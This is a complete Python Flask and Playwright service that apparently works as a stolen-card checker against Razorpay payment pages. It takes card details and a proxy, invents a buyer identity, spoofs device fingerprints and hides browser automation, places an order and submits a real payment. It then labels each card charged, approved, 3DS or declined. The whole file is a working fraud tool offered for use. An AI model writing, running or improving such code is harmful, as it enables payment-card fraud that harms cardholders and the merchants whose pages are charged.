import os, re, json, time, random, string, asyncio, hashlib, secrets, logging, threading
from base64 import b64encode
from urllib.parse import quote, unquote

from flask import Flask, request, jsonify
from playwright.async_api import async_playwright, TimeoutError as PWTimeoutError

PORT = int(os.getenv("PORT") or 8080)
POOL_FILE = os.getenv("RZ_POOL_FILE", "rz_pool.txt")
PROXY_FILE = os.getenv("RZ_PROXY_FILE", "px.txt")

BUILD = "afa3662e035e66c495f2ddc21c6f030530870f53"
BUILD_V1 = "da4ee3f43a28ad81dba8ed06daf899a4520c691f"

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")

LAUNCH_ARGS = ["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"]

DEFAULT_SITES = [
    "https://pages.razorpay.com/all-live-1",
    "https://pages.razorpay.com/all-live-2",
    "https://pages.razorpay.com/all-live-3",
    "https://pages.razorpay.com/all-live-5",
    "https://pages.razorpay.com/boxelements",
    "https://pages.razorpay.com/ezquant-halfyearly-new",
    "https://pages.razorpay.com/ezquant-weekly-new",
    "https://pages.razorpay.com/build-capacity",
    "https://pages.razorpay.com/bharatsastra",
    "https://pages.razorpay.com/mann",
]

logging.basicConfig(level=logging.INFO, format="[%(asctime)s] %(message)s", datefmt="%H:%M:%S")
log = logging.getLogger("rzp")

app = Flask(__name__)
app.config["JSON_SORT_KEYS"] = False

FIRST = ["Aarav","Vivaan","Aditya","Vihaan","Arjun","Sai","Ishaan","Rohan","Karan","Rahul"]
LAST = ["Sharma","Patel","Singh","Verma","Gupta","Reddy","Kumar","Joshi","Mehta","Nair"]
BASE62 = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"


def R(status, response, proxy_status="Live"):
    return {"proxy": proxy_status, "response": response, "status": status}


def rand_phone():
    return "+91" + random.choice("6789") + "".join(str(random.randint(0, 9)) for _ in range(9))

def rand_name():
    return f"{random.choice(FIRST)} {random.choice(LAST)}"

def rand_email(name):
    return name.lower().replace(" ", ".") + str(random.randint(1, 99)) + "@gmail.com"

def build_device_id():
    h = hashlib.sha1(secrets.token_bytes(16)).hexdigest()
    return f"1.{h}.{int(time.time()*1000)}.{random.randrange(10**8):08d}"

def parse_proxy(p):
    if not p: return None
    p = p.strip()
    scheme = "http"
    if "://" in p:
        s = p.split("://", 1)
        if s[0].lower() in ("http", "https", "socks4", "socks5"):
            scheme = s[0].lower()
            p = s[1]
    user = pwd = ""
    if "@" in p:
        auth, host = p.rsplit("@", 1)
        user, _, pwd = auth.partition(":")
    elif p.count(":") == 3:
        ip, port, user, pwd = p.split(":")
        host = f"{ip}:{port}"
    elif p.count(":") == 1:
        host = p
    else:
        return None
    cfg = {"server": f"{scheme}://{host}"}
    if user:
        cfg["username"] = user
        cfg["password"] = pwd
    return cfg

def parse_cc(cc):
    parts = cc.split("|")
    if len(parts) != 4: return None
    num, mm, yy, cvv = [x.strip() for x in parts]
    if not (num.isdigit() and mm.isdigit() and yy.isdigit() and cvv.isdigit()): return None
    if not (13 <= len(num) <= 19): return None
    if not (1 <= int(mm) <= 12): return None
    return {"number": num, "month": mm.zfill(2), "year": yy[-2:] if len(yy) == 4 else yy, "cvv": cvv}


# ─── SITES ───────────────────────────────────────────────────────────────────

_sites = []
_sites_lock = threading.Lock()

def load_sites():
    global _sites
    s = list(DEFAULT_SITES)
    try:
        with open(POOL_FILE, "r") as f:
            for ln in f:
                ln = ln.strip()
                if ln and not ln.startswith("#") and ln not in s:
                    s.append(ln)
    except FileNotFoundError:
        pass
    with _sites_lock:
        _sites = s
    log.info("sites: %d", len(s))

def pick_site():
    with _sites_lock:
        return random.choice(_sites) if _sites else None


# ─── CORE CHECK ──────────────────────────────────────────────────────────────

async def run_check(site_url, cc, proxy_cfg):
    t0 = time.time()
    card = parse_cc(cc)
    if not card:
        return R("error", "Invalid card format", "Live")

    name = rand_name()
    phone = rand_phone()
    email = rand_email(name)
    device_id = build_device_id()
    unified_id = "".join(secrets.choice(BASE62) for _ in range(14))

    pw = await async_playwright().start()
    browser = None
    ctx = None

    try:
        browser = await pw.chromium.launch(headless=True, proxy=proxy_cfg, args=LAUNCH_ARGS)
    except Exception as e:
        await pw.stop()
        msg = str(e)[:100].lower()
        dead = any(k in msg for k in ("proxy", "connect", "tunnel", "refused"))
        return R("error", f"browser failed: {str(e)[:100]}", "Dead" if dead else "Live")

    try:
        ctx = await browser.new_context(
            user_agent=UA,
            viewport={"width": 1366, "height": 768},
            locale="en-IN",
            timezone_id="Asia/Kolkata",
        )
        await ctx.add_init_script("Object.defineProperty(navigator,'webdriver',{get:()=>undefined});")
        page = await ctx.new_page()
        page.set_default_timeout(40000)

        # ── 1. load page + read RAW HTML (the working approach)
        try:
            await page.goto(site_url, wait_until="domcontentloaded", timeout=35000)
        except Exception as e:
            return R("error", f"site load: {str(e)[:100]}", "Live")

        html = await page.content()

        # extract `var data = {...}` — brace-counting
        data = None
        idx = html.find("var data =")
        if idx == -1:
            idx = html.find("var data=")
        if idx != -1:
            j = html.find("{", idx)
            if j != -1:
                depth, in_str, esc = 0, False, False
                for k in range(j, len(html)):
                    c = html[k]
                    if esc:
                        esc = False
                        continue
                    if c == "\\" and in_str:
                        esc = True
                        continue
                    if c == '"':
                        in_str = not in_str
                        continue
                    if in_str:
                        continue
                    if c == "{":
                        depth += 1
                    elif c == "}":
                        depth -= 1
                        if depth == 0:
                            try:
                                data = json.loads(html[j:k+1])
                            except Exception:
                                pass
                            break

        if not data:
            return R("error", "failed to parse var data", "Live")

        key_id = data.get("key_id")
        keyless_header = data.get("keyless_header")
        plink = (data.get("payment_link") or {}).get("id")
        items = (data.get("payment_link") or {}).get("payment_page_items") or []
        ppid = items[0].get("id") if items else None
        amount = int(items[0].get("item", {}).get("amount") or 100) if items else 100
        if amount < 100:
            amount = 100

        missing = [k for k, v in [
            ("key_id", key_id), ("keyless_header", keyless_header),
            ("payment_link_id", plink), ("payment_page_item_id", ppid),
        ] if not v]
        if missing:
            return R("error", f"missing: {','.join(missing)}", "Live")

        # ── 2. session token
        qs = "&".join(f"{k}={quote(str(v), safe='')}" for k, v in {
            "traffic_env": "production", "build": BUILD, "build_v1": BUILD_V1,
            "checkout_v2": "1", "new_session": "1",
            "keyless_header": keyless_header, "rzp_device_id": device_id,
            "unified_session_id": unified_id,
        }.items())

        try:
            await page.goto(f"https://api.razorpay.com/v1/checkout/public?{qs}",
                            wait_until="domcontentloaded", timeout=35000)
        except Exception as e:
            return R("error", f"checkout load: {str(e)[:100]}", "Live")

        session_html = await page.content()
        m = re.search(r'window\.session_token="([^"]+)"', session_html)
        if not m:
            m = re.search(r'session_token["\']?\s*[:=]\s*["\']([A-F0-9]{40,})["\']', session_html)
        if not m:
            return R("error", "session_token not found", "Live")
        session_token = m.group(1)

        # ── 3. order
        order_id = await page.evaluate("""async ([pl, ppi, amt]) => {
            try {
                const r = await fetch(`https://api.razorpay.com/v1/payment_pages/${pl}/order`, {
                    method: 'POST',
                    headers: {'Accept':'application/json','Content-Type':'application/json'},
                    body: JSON.stringify({
                        notes: {comment: '', name: 'User'},
                        line_items: [{payment_page_item_id: ppi, amount: amt}]
                    })
                });
                const d = await r.json();
                return d.order ? d.order.id : ('ERR:' + JSON.stringify(d.error || d));
            } catch (e) { return 'ERR:' + e.message; }
        }""", [plink, ppid, amount])

        if not order_id or str(order_id).startswith("ERR:"):
            return R("error", f"order: {str(order_id)[:80]}", "Live")

        checkout_id = order_id.split("_", 1)[1] if "_" in order_id else order_id

        payload = {
            "notes[comment]": "",
            "notes[email]": email,
            "notes[phone]": phone[3:],
            "notes[name]": name,
            "payment_link_id": plink,
            "key_id": key_id,
            "callback_url": "https://your-server.com/callback",
            "contact": phone,
            "email": email,
            "currency": "INR",
            "user_risk_providers_token": b64encode(json.dumps([
                {"name": "sardine", "metadata": {"session_id": checkout_id}}
            ], separators=(",", ":")).encode()).decode(),
            "_[integration]": "payment_pages",
            "_[checkout_id]": checkout_id,
            "_[device.id]": device_id,
            "_[library]": "checkoutjs",
            "_[library_src]": "no-src",
            "_[current_script_src]": "no-src",
            "_[platform]": "browser",
            "_[env]": "",
            "_[is_magic_script]": "false",
            "_[os]": "windows",
            "_[referer]": site_url,
            "_[shield][fhash]": hashlib.sha1(secrets.token_bytes(16)).hexdigest(),
            "_[shield][tz]": "330",
            "_[shield][os]": "windows",
            "_[shield][platform]": "browser",
            "_[shield][browser]": "chrome",
            "_[device_id]": device_id,
            "_[build]": BUILD,
            "_[request_index]": "1",
            "amount": str(amount),
            "order_id": order_id,
            "method": "card",
            "card[number]": card["number"],
            "card[cvv]": card["cvv"],
            "card[name]": name,
            "card[expiry_month]": card["month"],
            "card[expiry_year]": card["year"],
            "save": "0",
        }

        # ── 4. submit payment
        result = await page.evaluate("""async ([payload, k, st, kh]) => {
            const qs = new URLSearchParams({key_id: k, session_token: st, keyless_header: kh});
            const body = new URLSearchParams();
            for (const [key, val] of Object.entries(payload)) body.append(key, val);
            try {
                const r = await fetch(
                    `https://api.razorpay.com/v1/standard_checkout/payments/create/ajax?${qs}`,
                    {
                        method: 'POST',
                        headers: {
                            'x-session-token': st,
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'Origin': 'https://api.razorpay.com',
                        },
                        body: body.toString()
                    }
                );
                const text = await r.text();
                let parsed;
                try { parsed = JSON.parse(text); } catch { parsed = text; }
                return {status: r.status, body: parsed, raw: text.slice(0, 400)};
            } catch (e) { return {status: 0, body: 'NETWORK:' + e.message, raw: ''}; }
        }""", [payload, key_id, session_token, keyless_header])

        body = result.get("body") if isinstance(result, dict) else result
        status_code = result.get("status", 0) if isinstance(result, dict) else 0

        payment_id = None
        if isinstance(body, dict):
            payment_id = (body.get("payment_id")
                          or body.get("razorpay_payment_id")
                          or (body.get("payment") or {}).get("id"))

            # 3DS redirect
            if body.get("redirect") is True or body.get("type") == "redirect":
                redirect_url = body.get("request", {}).get("url", "") if isinstance(body.get("request"), dict) else ""
                if redirect_url:
                    try:
                        await page.goto(redirect_url, wait_until="domcontentloaded", timeout=40000)
                        rh = await page.content()
                        if "razorpay_signature" in rh:
                            return R("charged", "Payment Successful", "Live")
                        st = await page.evaluate("""async ([pid, k, st, kh]) => {
                            const qs = new URLSearchParams({key_id: k, session_token: st, keyless_header: kh});
                            try {
                                const r = await fetch(`https://api.razorpay.com/v1/standard_checkout/payments/${pid}?${qs}`,
                                    {headers: {'x-session-token': st}});
                                const d = await r.json();
                                return d.status || 'unknown';
                            } catch { return 'unknown'; }
                        }""", [payment_id, key_id, session_token, keyless_header])
                        if st in ("captured", "authorized"):
                            return R("charged", f"payment_id: {payment_id} | {st}", "Live")
                        if st == "pending":
                            return R("3ds", f"payment_id: {payment_id} | OTP Required", "Live")
                        return R("3ds", f"payment_id: {payment_id} | 3DS challenge", "Live")
                    except Exception as e:
                        return R("3ds", f"3ds redirect: {str(e)[:100]}", "Live")
                return R("3ds", "3ds redirect without url", "Live")

            if "razorpay_signature" in body or "signature" in body:
                return R("charged", "Payment Successful", "Live")

            if "error" in body:
                err = body["error"]
                desc = err.get("description") or err.get("reason") or str(err)
                reason = err.get("reason") or ""
                label = f"{desc} ({reason})" if reason else desc
                text = label.lower()
                if any(k in text for k in ("insufficient", "balance", "cvv", "incorrect_cvv", "cvc", "ccn")):
                    return R("approved", label, "Live")
                if any(k in text for k in ("otp", "3ds", "challenge", "authentication")):
                    return R("3ds", label, "Live")
                return R("declined", label, "Live")

            if body.get("status") in ("captured", "authorized"):
                return R("charged", f"payment_id: {payment_id or 'n/a'}", "Live")

            return R("error", f"HTTP {status_code}: {json.dumps(body)[:180]}", "Live")

        return R("error", f"HTTP {status_code}: {str(body)[:180]}", "Live")

    except PWTimeoutError as e:
        return R("error", f"timeout: {str(e)[:100]}", "Live")
    except Exception as e:
        return R("error", f"err: {str(e)[:150]}", "Live")
    finally:
        try:
            if ctx: await ctx.close()
        except Exception: pass
        try:
            await browser.close()
        except Exception: pass
        try:
            await pw.stop()
        except Exception: pass


# ─── SYNC WRAPPER ────────────────────────────────────────────────────────────

def run_check_sync(site, cc, proxy_cfg):
    try:
        return asyncio.run(run_check(site, cc, proxy_cfg))
    except Exception as e:
        return R("error", f"wrap: {str(e)[:150]}", "Live")


# ─── ROUTES ──────────────────────────────────────────────────────────────────

@app.route("/rz", methods=["GET"])
@app.route("/razorpay", methods=["GET"])
def rz_route():
    cc = (request.args.get("cc") or "").strip()
    proxy = (request.args.get("proxy") or "").strip()
    site = (request.args.get("site") or "").strip()

    if not cc:
        return jsonify(R("error", "Missing cc", "Live")), 400
    cc = unquote(cc)
    if not parse_cc(cc):
        return jsonify(R("error", "Invalid card. Use cc|mm|yy|cvv", "Live")), 400
    if not proxy:
        return jsonify(R("error", "Missing proxy", "Dead")), 400

    proxy_cfg = parse_proxy(unquote(proxy))
    if not proxy_cfg:
        return jsonify(R("error", "Invalid proxy format", "Dead")), 400

    site = site or pick_site()
    if not site:
        return jsonify(R("error", "no sites", "Live")), 500

    log.info("checking site=%s", site.replace("https://pages.razorpay.com/", "")[:40])
    result = run_check_sync(site, cc, proxy_cfg)
    log.info("[%s] %s", result.get("status", "?").upper(), result.get("response", "")[:70])

    code = 500 if result.get("status") == "error" else 200
    return jsonify(result), code


@app.route("/pool", methods=["GET"])
def pool_route():
    with _sites_lock:
        return jsonify({"total": len(_sites), "sites": list(_sites)})


@app.route("/health", methods=["GET"])
@app.route("/", methods=["GET"])
def health_route():
    with _sites_lock:
        return jsonify({"status": "ok", "sites": len(_sites), "build": BUILD})


# ─── BOOT ────────────────────────────────────────────────────────────────────

load_sites()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=PORT, threaded=True, debug=False, use_reloader=False)